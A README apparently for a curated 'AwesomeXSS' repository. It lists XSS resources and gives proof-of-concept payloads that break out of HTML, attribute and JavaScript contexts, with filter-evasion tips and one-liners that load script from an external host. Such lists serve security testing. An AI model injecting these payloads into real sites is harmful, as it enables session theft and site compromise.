# AwesomeXSS
Awesome XSS stuff.
Put this repo on watch. I will be updating it regularly.

### Awesome Books
- [XSS Cheat Sheet By Brute Logic](http://google.com)

### Awesome Websites
- [brutelogic.com.br](http://brutelogic.com.br)
- [respectxss.blogspot.in](https://respectxss.blogspot.in/)

### Awesome People
- [Rodolfo Assis](https://twitter.com/brutelogic)
- [Ashar Javed](https://twitter.com/soaj1664ashar)
- [Somdev Sangwan](https://twitter.com/s0md3v) I own this repo, I can write whatever the fuck I want :v

### Awesome Reads
- [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)

### Awesome Presentations
- [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
- [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)
- [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)
- [Copy Pest](https://www.slideshare.net/x00mario/copypest)

### Awesome Context Breaking

#### Simple Context
```
<svg onload=alert()>
</tag><svg onload=alert()>
```

#### Attribute Context
```
"><svg onload=alert()>
"><svg onload=alert()><b attr="
" onmouseover=alert() "
"onmouseover=alert()//
```
#### JavaScript Context
```
'-alert()-'
'-alert()//'
'}alert(1);{'
'}%0Aalert(1);%0A{'
</script><svg onload=alert()>
```

### Awesome Payloads
Come back later

### Awesome Exploits
Come back later

### Awesome Tags & Event Handlers
Come back later

### Awesome Methodology
Come back later

### Awesome Tools
- [XSStrike](http://xsstrike.tk/)
- [KNOXSS](http://knoxss.me/)

### Awesome Tips & Tricks
- http:// can be shortened to //
- **document.cookie** can be shortened to **cookie**. It applies to other DOM objects as well.
- alert and other pop-up functions don't need a value, so stop doing **alert(1)** and start doing **alert()**
- I have found that **confirm** is the least detected pop-up function so stop using **alert**.
- Quotes around attribute value aren't neccessary. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&glt;**
- The shortest independent payload is **&lt;embed src=//14.rs&gt;** (19 chars)

## Credits and all that
All the payloads are crafted by me unless specified.
Thanks to my big brother [Rodolfo Assis](https://twitter.com/brutelogic) whose writings inspired me to become an XSSLord.
